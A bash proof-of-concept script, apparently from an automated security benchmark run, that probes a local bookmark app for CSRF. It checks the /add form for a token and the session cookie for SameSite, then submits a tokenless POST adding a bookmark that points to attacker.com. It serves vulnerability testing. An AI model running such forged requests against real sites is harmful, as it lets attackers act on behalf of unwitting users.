#!/bin/bash
# POC: Demonstrates CSRF vulnerability - /add endpoint lacks CSRF token validation and session cookie missing SameSite attribute
# Target: ./repo
# Created: 2025-11-07T17:38:30.913Z
# Session: benchmark-XBEN-075-24-mhp4u83c

# CSRF Vulnerability POC - No Token Protection
# Demonstrates that the /add endpoint accepts POST requests without CSRF token validation
# and the session cookie lacks SameSite attribute

TARGET_URL="http://localhost:5000"

echo "=== CSRF Vulnerability Proof-of-Concept ==="
echo ""

# Step 1: Get the add form to check for CSRF token
echo "[*] Step 1: Checking /add endpoint for CSRF token..."
FORM_HTML=$(curl -s "$TARGET_URL/add")

if echo "$FORM_HTML" | grep -q "csrf\|token"; then
    echo "[!] CSRF token found in form"
    echo "$FORM_HTML" | grep -i "csrf\|token"
else
    echo "[+] No CSRF token found in /add form (VULNERABLE)"
fi

echo ""

# Step 2: Check session cookie for SameSite attribute
echo "[*] Step 2: Checking session cookie for SameSite attribute..."
SET_COOKIE_HEADER=$(curl -s -i "$TARGET_URL/add" | grep -i "set-cookie")

if [ -z "$SET_COOKIE_HEADER" ]; then
    echo "[*] Getting session via /list endpoint..."
    SET_COOKIE_HEADER=$(curl -s -i "$TARGET_URL/list" | grep -i "set-cookie")
fi

echo "Set-Cookie header: $SET_COOKIE_HEADER"

if echo "$SET_COOKIE_HEADER" | grep -iq "samesite"; then
    echo "[!] SameSite attribute found"
    echo "$SET_COOKIE_HEADER"
else
    echo "[+] SameSite attribute NOT found on session cookie (VULNERABLE)"
    echo "[+] Session cookie will be sent in cross-origin requests"
fi

echo ""

# Step 3: Demonstrate CSRF by submitting form without token
echo "[*] Step 3: Attempting POST to /add without CSRF token..."

# First, establish a session
COOKIE_JAR=$(mktemp)
curl -s -c "$COOKIE_JAR" "$TARGET_URL/list" > /dev/null

# Attempt to add a bookmark without CSRF token
RESPONSE=$(curl -s -b "$COOKIE_JAR" -X POST "$TARGET_URL/add" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=CSRF_Test_Bookmark&url=http://attacker.com/test" \
  -w "\n%{http_code}")

HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
RESPONSE_BODY=$(echo "$RESPONSE" | head -n-1)

echo "HTTP Response Code: $HTTP_CODE"

if [ "$HTTP_CODE" = "302" ] || [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "201" ]; then
    echo "[+] POST request accepted without CSRF token (VULNERABLE)"
    echo "[+] Bookmark was added successfully without token validation"
    
    # Verify bookmark was added
    curl -s -b "$COOKIE_JAR" "$TARGET_URL/list" | grep -q "CSRF_Test_Bookmark"
    if [ $? -eq 0 ]; then
        echo "[+] CONFIRMED: Bookmark 'CSRF_Test_Bookmark' was successfully added"
        echo "[+] CSRF vulnerability confirmed - POST accepted without token"
    fi
else
    echo "[-] POST request was rejected (HTTP $HTTP_CODE)"
fi

rm -f "$COOKIE_JAR"

echo ""
echo "=== Summary ==="
echo "[+] CSRF Vulnerability Confirmed:"
echo "    - No CSRF token in form"
echo "    - No SameSite attribute on session cookie"
echo "    - POST requests accepted without token validation"
echo "[+] This allows attackers to forge requests from other origins"